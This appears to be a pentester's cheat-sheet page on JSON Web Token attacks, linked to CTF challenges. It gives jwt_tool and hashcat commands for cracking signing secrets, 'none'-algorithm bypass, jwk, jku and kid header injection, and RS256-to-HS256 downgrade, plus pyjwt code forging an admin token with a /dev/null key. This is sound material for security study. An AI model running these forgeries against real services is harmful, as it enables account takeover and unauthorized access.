# JSON Web Token (JWT)

[![hacking_jwt](../../../../_badges/hacktricks/hacking_jwt.svg)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
[![json_web_token](../../../../_badges/poat/json_web_token.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)

<div class="row row-cols-lg-2"><div>

JSON Web Token (JWT) are used to represent signed data. They are commonly used in for authentication and authorization.

The format is: `<algo>.<data>.<signature>`. Each part is base64 encoded, so the final string is URL-safe while it can be easily decoded.

The data is signed using a secret key. If the secret key is compromised, everyone can sign messages 🔏.

The signature is used to detect if data was tampered with.
</div><div>

They can be transferred and found in:

* 📚 Headers (`Authorization: Bearer <JWT>`)
* 🍪 Cookies
* 📄 URL Parameters
* 💼 Request Body
* ...

📚 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
</div></div>

<hr class="sep-both">

## Common JWT Attacks

<div class="row row-cols-lg-2"><div>

You can use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(4.8k ⭐)</small> to attack JWT:

```shell!
$ git clone https://github.com/ticarpi/jwt_tool.git $HOME/tools/jwt_tool
$ chmod +x $HOME/tools/jwt_tool/jwt_tool.py
$ ln -s $HOME/tools/jwt_tool/jwt_tool.py $HOME/.local/bin/jwt_tool
$ jwt_tool -h
```

```ps
$ jwt_tool 'jwt'             # decode
$ jwt_tool 'jwt' -T          # encode
$ jwt_tool 'jwt' -I -pc claim -pv value
```

You can also use [jwt.io](https://jwt.io/).

<br>

#### Secret Key Brute Forcing

[![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)

The secret key may be weak and brute forced:

```ps
$ jwt_tool 'jwt' -T -p "key" # use secret key
$ jwt_tool 'jwt' -C -d ./jwt.secrets.list # crack key
```

```ps
$ hashcat -m 16500 hash ./jwt.secrets.list
```

<br>

#### JWT Header Injection — None Algorithm

[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)

We may be able to disable the tampering check by setting the signature algorithm to 'none.'

```ps
$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
```

📚 It also possible for the signature to not be checked at all by the server after issuing a JWT even if there is an algorithm.

<br>

#### JWT Header Injection — JWK

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)

An application may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.

```ps
$ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
$ jwt_tool 'jwt' -T -X i -hc kid -hv jwt_tool     # with kid
```
</div><div>

#### JWT Header Injection — JKU

[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

The `jku` header contains a URL or a filename used to fetch a key.

* When a asymmetric algorithm such as RS is used:

```shell!
$ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
$ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
```

📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight on URLs <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).

<br>

#### JWT Header Injection — KID

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
[![jwt_unsecure_file_signature](../../../../_badges/rootme/web_server/jwt_unsecure_file_signature.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)

The kid header may be present in two scenarios. The first one is to define which key file to use: `-p` must match the contents of `/dev/null`.

```shell!
$ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
```

The `kid` header may be used along with `jku`. The JSON file pointed by `jku` may contain multiple keys, and `kid` determines which one to use.

➡️ Refer to [Path Traversal](/cybersecurity/red-team/s3.exploitation/vulns/web/path_traversal.md) if there is some filtering.

<br>

#### JWT Header Injection — RS256 to HS256

[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)

When using RS256 algorithm, JWT uses the private key to sign the JWK and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.

```ps
$ jwt_tool 'jwt' -S hs256 -k public.key -T
```

You can compute the public key if you have two messages:

```ps
$ docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
```
</div></div>

<hr class="sep-both">

## Python JWT

<div class="row row-cols-lg-2"><div>

The [pyjwt](https://github.com/jpadilla/pyjwt) <small>(5.0k ⭐)</small> library can be used to manipulate JWT in Python. There are two unmaintained alternatives which are:

* [python-jwt by GehirnInc](https://github.com/GehirnInc/python-jwt) <small>(0.1k ⭐, 2022 🪦)</small>
* [python-jwt by D. Halls](https://github.com/davedoesdev/python-jwt) <small>(0.2k ⭐, 2023 🪦)</small> — has two CVEs

```py
headers = {
    'kid': '/dev/null'
}
payload = {
    'role': 'admin',
    'iat': int(datetime.datetime.now(datetime.UTC).timestamp())
}
```
</div><div>

To install it:

```shell!
$ pip install pyjwt
```

To generate a JWT:

```py
import jwt
token = jwt.encode(payload, '', algorithm='HS512', headers=headers)
```

To decode a JWT:

```py
import jwt
payload = jwt.decode(token, '', algorithms=['HS512'])
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [PortSwigger JWT](https://portswigger.net/web-security/jwt)
* [jwtcrack/jwt2john](https://github.com/Sjord/jwtcrack)
</div><div>
</div></div>